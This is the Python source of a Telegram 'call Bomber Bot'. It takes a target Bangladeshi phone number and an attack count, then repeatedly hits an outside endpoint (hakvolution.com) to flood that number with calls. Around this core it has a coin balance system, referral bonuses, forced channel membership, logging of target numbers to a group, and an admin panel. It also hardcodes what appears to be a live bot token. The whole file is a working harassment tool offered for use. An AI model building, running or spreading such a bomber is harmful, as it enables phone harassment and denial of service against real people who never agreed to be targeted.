import telebot
from telebot import types
import sqlite3, requests, time
from datetime import datetime

BOT_TOKEN = "7637226217:AAHkaw2bq_8vwuJWMB2jAXarZRfJWUJ3cdQ"
ADMIN_IDS = [7276206449, 6153708648]
ADMIN_CONTACT = "@Unkonwn_BMT"
ADMIN_CONTACTS = "@Unkonwn_BMT"

FORCE_CHANNEL = "@mbtcyber"
FORCE_CHANNEL_ID = "@mbtcyber"
LOG_GROUP_ID = -1003780103907

JOIN_BONUS = 5     # New user bonus
REF_BONUS = 15     # Referral bonus

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

db = sqlite3.connect("bot.db", check_same_thread=False)
cur = db.cursor()

# ===== DATABASE =====
cur.execute("""
CREATE TABLE IF NOT EXISTS users(
 user_id INTEGER PRIMARY KEY,
 balance INTEGER DEFAULT 2,
 banned INTEGER DEFAULT 0,
 name TEXT,
 join_date TEXT,
 total_sms INTEGER DEFAULT 0,
 referred_by INTEGER,
 ref_done INTEGER DEFAULT 0
)
""")

cur.execute("""
CREATE TABLE IF NOT EXISTS stats(
 id INTEGER PRIMARY KEY,
 total_sms INTEGER DEFAULT 0,
 bot_status INTEGER DEFAULT 1
)
""")

cur.execute("""
CREATE TABLE IF NOT EXISTS sms_log(
 id INTEGER PRIMARY KEY AUTOINCREMENT,
 user_id INTEGER,
 number TEXT,
 time TEXT
)
""")
cur.execute("INSERT OR IGNORE INTO stats(id,total_sms,bot_status) VALUES(1,0,1)")
db.commit()
cur.execute("ALTER TABLE users ADD COLUMN last_daily INTEGER DEFAULT 0")
db.commit()
# ===== UTILS =====
def get_user(uid):
    cur.execute("SELECT balance,banned,name,join_date,total_sms FROM users WHERE user_id=?", (uid,))
    r = cur.fetchone()
    if not r:
        now = datetime.now().strftime("%Y-%m-%d")
        cur.execute("INSERT INTO users(user_id,balance,join_date) VALUES(?,?,?)", (uid,JOIN_BONUS,now))
        db.commit()
        send_join_log(uid)
        return JOIN_BONUS, 0, "", now, 0
    return r

def get_all_users():
    cur.execute("SELECT user_id,balance,total_sms,join_date FROM users")
    return cur.fetchall()

def is_joined_channel(uid):
    try:
        m = bot.get_chat_member(FORCE_CHANNEL_ID, uid)
        return m.status in ["member","administrator","creator"]
    except:
        return False

def send_log(uid, number):
    bal,_,_,_,_ = get_user(uid)
    try:
        u = bot.get_chat(uid)
        text = (
            "📤 <b>Attack LOG</b>\n\n"
            f"👤 User: {u.first_name}\n"
            f"🆔 ID: {uid}\n"
            f"📱 Number: {number}\n"
            f"💰 Balance Left: {bal}\n"
            f"⏰ Time: {time.ctime()}"
        )
        bot.send_message(LOG_GROUP_ID, text)
    except:
        pass

def send_join_log(uid):
    bot.send_message(
        LOG_GROUP_ID,
        f"🆕 <b>New User Joined</b>\n🆔 {uid}\n🎁 Bonus: {JOIN_BONUS} SMS"
    )

def send_ref_log(ref, new):
    bot.send_message(
        LOG_GROUP_ID,
        f"🎁 <b>Referral Bonus</b>\n\n"
        f"👤 Referrer: {ref}\n"
        f"🆕 New User: {new}\n"
        f"💰 +{REF_BONUS} coin"
    )
def make_bar(percent):
    filled = int(percent / 10)
    return "█" * filled + "░" * (10 - filled)
    
def main_menu(uid):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("🧨Start Attack")
    kb.add("💰 Balance","🎁 Daily Bonus")
    kb.add("🎁 Refer & Earn")
    kb.add("🆘 Support")
    if uid in ADMIN_IDS:
        kb.add("⚙ Admin Panel")
    return kb

def back_kb():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("⬅ Back")
    return kb

# ===== STATES =====
sms_state = {}
broadcast_state = {}

# ===== START / JOIN / REF =====
@bot.message_handler(commands=["start"])
def start(m):
    uid = m.from_user.id
    args = m.text.split()

    if not is_joined_channel(uid):
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("🔗 Join Channel", url=f"https://t.me/{FORCE_CHANNEL.replace('@','')}"))
        kb.add(types.InlineKeyboardButton("🔄 Check Join", callback_data="check_join"))
        bot.send_message(m.chat.id,"If You Want To Use This Bot Please Join Our Channel Fast",reply_markup=kb)
        return

    # Check if user exists
    cur.execute("SELECT user_id FROM users WHERE user_id=?", (uid,))
    exists = cur.fetchone()

    # Referral ID
    ref_id = None
    if len(args) == 2 and args[1].isdigit():
        if int(args[1]) != uid:
            ref_id = int(args[1])

    # New user
    if not exists:
        cur.execute(
            "INSERT INTO users(user_id,balance,join_date,referred_by) VALUES(?,?,?,?)",
            (uid, JOIN_BONUS, datetime.now().strftime("%Y-%m-%d"), ref_id)
        )
        db.commit()
        send_join_log(uid)

        # Give referral bonus
        if ref_id:
            cur.execute("SELECT ref_done FROM users WHERE user_id=?", (uid,))
            if cur.fetchone()[0] == 0:
                cur.execute("UPDATE users SET balance=balance+? WHERE user_id=?", (REF_BONUS, ref_id))
                cur.execute("UPDATE users SET ref_done=1 WHERE user_id=?", (uid,))
                db.commit()
                send_ref_log(ref_id, uid)
                # 🔔 Notify referrer
        try:
            bot.send_message(
                ref_id,
                f"🎁 <b>Referral Success!</b>\n\n"
                f"You received +{REF_BONUS} Coin 🎉"
            )
        except Exception:
            pass

    bal, ban, *_ = get_user(uid)
    if ban:
        bot.send_message(m.chat.id,"🚫 You are banned")
        return

    bot.send_message(m.chat.id,"👋 <b>Welcome To Our call Bomber Bot. Develpoed By @Unkonwn_BMT</b>",reply_markup=main_menu(uid))

@bot.callback_query_handler(func=lambda c:c.data=="check_join")
def check_join(c):
    if is_joined_channel(c.from_user.id):
        bot.answer_callback_query(c.id,"✅ Joined")
        bot.send_message(c.message.chat.id,"👋 <b>Welcome To Our call Bomber Bot. Develpoed By @Unkonwn_BMT</b>",reply_markup=main_menu(c.from_user.id))
    else:
        bot.answer_callback_query(c.id,"❌ Not joined",show_alert=True)

# ===== SEND SMS =====
@bot.message_handler(func=lambda m:m.text=="🧨Start Attack")
def sms_start(m):
    uid = m.from_user.id
    bal,_,_,_,_ = get_user(uid)

    if bal <= 0:
        bot.send_message(m.chat.id,"❌ Balance finished")
        return

    sms_state[uid] = {"step":"number"}
    bot.send_message(m.chat.id,"📱 Enter Your Target number",reply_markup=back_kb())

@bot.message_handler(func=lambda m: m.from_user.id in sms_state)
def sms_flow(m):
    uid = m.from_user.id

    if m.text == "⬅ Back":
        sms_state.pop(uid, None)
        bot.send_message(m.chat.id, "🔙 Back", reply_markup=main_menu(uid))
        return

    state = sms_state[uid]

    # STEP 1: Number
    if state["step"] == "number":
        if not m.text.isdigit() or len(m.text) != 11 or not m.text.startswith("01"):
            bot.send_message(m.chat.id, "❌ Invalid number enter 11 digit BD numner Only")
            return

        state["number"] = m.text
        state["step"] = "limit"
        bot.send_message(m.chat.id, "One attack limit mean One call\n\n✍ Enter Your Attack limit")
        return

    # STEP 2: Limit
    if state["step"] == "limit":
        if not m.text.isdigit() or int(m.text) <= 0:
            bot.send_message(m.chat.id, "❌ Invalid Attack limit")
            return

        limit = int(m.text)

        cur.execute("SELECT balance FROM users WHERE user_id=?", (uid,))
        bal = cur.fetchone()[0]

        send_count = min(limit, bal)

        # ✅ LOADING MESSAGE (একবার)
        progress_msg = bot.send_message(
            m.chat.id,
            "⏳ <b>Processing Attack...</b>\n\n"
            "[░░░░░░░░░░] 0%"
        )

        success = 0

        # ✅ MAIN LOOP
        for i in range(send_count):
            try:
                r = requests.get(
                    f"https://hakvolution.com/Sp/XCLB.php?number={state['number']}",
                    timeout=10
                )

                if r.status_code == 200:
                    success += 1

                    cur.execute(
                        "UPDATE users SET balance=balance-1,total_sms=total_sms+1 WHERE user_id=?",
                        (uid,)
                    )
                    cur.execute(
                        "UPDATE stats SET total_sms=total_sms+1 WHERE id=1"
                    )
                    cur.execute(
                        "INSERT INTO sms_log(user_id,number,time) VALUES(?,?,?)",
                        (uid, state["number"], time.ctime())
                    )
                    db.commit()

                # 🔥 PROGRESS UPDATE (এইটাই তুমি জিজ্ঞেস করছিলে)
                percent = int(((i + 1) / send_count) * 100)
                bar = make_bar(percent)

                bot.edit_message_text(
                    f"⏳ <b>Processing Attack...</b>\n\n"
                    f"[{bar}] {percent}%",
                    m.chat.id,
                    progress_msg.message_id
                )

                if i < send_count - 1:
                    time.sleep(10)

            except:
                break

        # ✅ FINAL UPDATE (same message)
        bot.edit_message_text(
            f"✅ <b>Completed!</b>\n\n"
            f"Total Sent: {success}",
            m.chat.id,
            progress_msg.message_id
        )

        send_log(uid, state["number"])
        sms_state.pop(uid, None)
# ===== BALANCE / BUY / SUPPORT / REF =====
@bot.message_handler(func=lambda m:m.text=="💰 Balance")
def bal(m):
    b,_,_,_,_ = get_user(m.from_user.id)
    bot.send_message(m.chat.id,f"💰 Your Balance: {b} Coin\n\n To buy Balance Contact Admin")

@bot.message_handler(func=lambda m: m.text=="🎁 Daily Bonus")
def daily_bonus(m):
    ok, wait = claim_daily(m.from_user.id)
    if ok:
        bot.send_message(m.chat.id, f"🎉 You received {DAILY_BONUS} coin!")
    else:
        bot.send_message(m.chat.id, f"You Already Climed Your Bonus Please ⏳ Wait {wait//3600}h {(wait%3600)//60}m")
        
DAILY_BONUS = 10

def claim_daily(uid):
    cur.execute("SELECT last_daily FROM users WHERE user_id=?", (uid,))
    r = cur.fetchone()
    now = datetime.now()

    if r and r[0]:
        last = datetime.strptime(r[0], "%Y-%m-%d %H:%M:%S")
        if (now - last).total_seconds() < 86400:
            return False, int(86400 - (now-last).total_seconds())

    cur.execute("""
        UPDATE users 
        SET balance = balance + ?, last_daily = ?
        WHERE user_id = ?
    """, (DAILY_BONUS, now.strftime("%Y-%m-%d %H:%M:%S"), uid))
    db.commit()
    return True, 0

@bot.message_handler(func=lambda m:m.text=="🆘 Support")
def sup(m):
    bot.send_message(m.chat.id,f"If you need any help Support: {ADMIN_CONTACT}")

@bot.message_handler(func=lambda m:m.text=="🎁 Refer & Earn")
def refer(m):
    uid = m.from_user.id
    link = f"https://t.me/{bot.get_me().username}?start={uid}"
    bot.send_message(
        m.chat.id,
        f"🎁 <b>Refer & Earn</b>\n\n"
        f"💰 Get {REF_BONUS} Balance per referral\n\n"
        f"🔗 <code>{link}</code>"
    )

# ===== ADMIN PANEL =====
@bot.message_handler(func=lambda m:m.text=="⚙ Admin Panel")
def admin_panel(m):
    if m.from_user.id not in ADMIN_IDS: return
    cur.execute("SELECT COUNT(*) FROM users")
    total_users = cur.fetchone()[0]
    cur.execute("SELECT total_sms FROM stats WHERE id=1")
    total_sms = cur.fetchone()[0]
    cur.execute("SELECT SUM(balance) FROM users")
    total_balance = cur.fetchone()[0]

    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("➕ Add Balance","➖ Remove Balance","🚫 Ban User","✅ Unban User")
    kb.add("👥 View Users","📣 Broadcast")
    kb.add("📴 Bot OFF","📳 Bot ON")
    kb.add("📊 Stats","⬅ Back")
    bot.send_message(
        m.chat.id,
        f"⚙ <b>Admin Panel</b>\n\n"
        f"👤 Total Users: {total_users}\n"
        f"📨 Total Attack Sent: {total_sms}\n"
        f"💰 Total Balance: {total_balance} Coin",
        reply_markup=kb
    )

# ====== ADMIN ADD / REMOVE BALANCE ======
@bot.message_handler(func=lambda m:m.text=="➕ Add Balance")
def admin_add_balance(m):
    msg = bot.send_message(m.chat.id,"Enter User ID:")
    bot.register_next_step_handler(msg, admin_add_balance_amt)

def admin_add_balance_amt(m):
    try:
        uid = int(m.text)
        msg = bot.send_message(m.chat.id,"Enter Amount of Balance to Add:")
        bot.register_next_step_handler(msg, lambda x: add_balance_final(x,uid))
    except:
        bot.send_message(m.chat.id,"❌ Invalid ID")

def add_balance_final(m,uid):
    try:
        amt = int(m.text)
        cur.execute("UPDATE users SET balance=balance+? WHERE user_id=?", (amt,uid))
        db.commit()
        bot.send_message(m.chat.id,f"✅ Added {amt} Balance to {uid}")
        bot.send_message(uid, f"💰 Admin added {amt} balance to your account!")
    except:
        bot.send_message(m.chat.id,"❌ Error")

@bot.message_handler(func=lambda m:m.text=="➖ Remove Balance")
def admin_remove_balance(m):
    msg = bot.send_message(m.chat.id,"Enter User ID:")
    bot.register_next_step_handler(msg, ask_remove_amount)

def ask_remove_amount(m):
    try:
        uid = int(m.text)
        msg = bot.send_message(m.chat.id,"Enter amount to remove:")
        bot.register_next_step_handler(msg, lambda x: remove_balance_final(x, uid))
    except:
        bot.send_message(m.chat.id,"❌ Invalid ID")

def remove_balance_final(m, uid):
    try:
        amt = int(m.text)
        cur.execute("UPDATE users SET balance = CASE WHEN balance-? < 0 THEN 0 ELSE balance-? END WHERE user_id=?",
                    (amt, amt, uid))
        db.commit()
        bot.send_message(m.chat.id,f"✅ Removed {amt} Balance from {uid}")
    except:
        bot.send_message(m.chat.id,"❌ Error")

# ====== REST ADMIN HANDLERS (Ban/Unban/Bot ON/OFF/Stats/View Users/Broadcast) ======
@bot.message_handler(func=lambda m:m.text=="🚫 Ban User")
def admin_ban(m):
    msg = bot.send_message(m.chat.id,"Enter User ID to Ban:")
    bot.register_next_step_handler(msg, lambda x: exec_ban(x))

def exec_ban(m):
    cur.execute("UPDATE users SET banned=1 WHERE user_id=?", (int(m.text),))
    db.commit()
    bot.send_message(m.chat.id,"🚫 User Banned")

@bot.message_handler(func=lambda m:m.text=="✅ Unban User")
def admin_unban(m):
    msg = bot.send_message(m.chat.id,"Enter User ID to Unban:")
    bot.register_next_step_handler(msg, lambda x: exec_unban(x))

def exec_unban(m):
    cur.execute("UPDATE users SET banned=0 WHERE user_id=?", (int(m.text),))
    db.commit()
    bot.send_message(m.chat.id,"✅ User Unbanned")

@bot.message_handler(func=lambda m:m.text=="📴 Bot OFF")
def bot_off(m):
    cur.execute("UPDATE stats SET bot_status=0 WHERE id=1")
    db.commit()
    bot.send_message(m.chat.id,"❌ Bot is now OFF")

@bot.message_handler(func=lambda m:m.text=="📳 Bot ON")
def bot_on_cmd(m):
    cur.execute("UPDATE stats SET bot_status=1 WHERE id=1")
    db.commit()
    bot.send_message(m.chat.id,"✅ Bot is now ON")

@bot.message_handler(func=lambda m:m.text=="📊 Stats")
def admin_stats(m):
    cur.execute("SELECT COUNT(*),SUM(balance) FROM users")
    total_users, total_bal = cur.fetchone()
    cur.execute("SELECT total_sms FROM stats WHERE id=1")
    total_sms = cur.fetchone()[0]
    bot.send_message(m.chat.id,
                     f"📊 <b>Bot Stats</b>\n\n"
                     f"👤 Total Users: {total_users}\n"
                     f"💰 Total Balance: {total_bal} SMS\n"
                     f"📨 Total Attack Sent: {total_sms}"
                     )

@bot.message_handler(func=lambda m:m.text=="👥 View Users")
def view_users(m):
    users = get_all_users()
    text = "<b>All Users:</b>\n\n"
    for u in users:
        text += f"ID: {u[0]} | Balance: {u[1]} | Attack Sent: {u[2]} | Join: {u[3]}\n"
    bot.send_message(m.chat.id,text)

@bot.message_handler(func=lambda m:m.text=="📣 Broadcast")
def start_broadcast(m):
    broadcast_state[m.from_user.id] = True
    bot.send_message(m.chat.id,"📝 Enter the message to broadcast to all users:")

@bot.message_handler(func=lambda m:m.text and m.from_user.id in broadcast_state)
def broadcast_message(m):
    msg = m.text
    users = get_all_users()
    sent = 0
    for u in users:
        try:
            bot.send_message(u[0], msg)
            sent += 1
        except:
            continue
    bot.send_message(m.chat.id,f"✅ Broadcast sent to {sent} users")
    broadcast_state.pop(m.from_user.id)

# ===== BACK BUTTON =====
@bot.message_handler(func=lambda m:m.text=="⬅ Back")
def back_menu(m):
    sms_state.pop(m.from_user.id, None)
    broadcast_state.pop(m.from_user.id, None)
    bot.send_message(m.chat.id,"🔙 Back to Main Menu",reply_markup=main_menu(m.from_user.id))

print("Bot running...")
bot.infinity_polling()
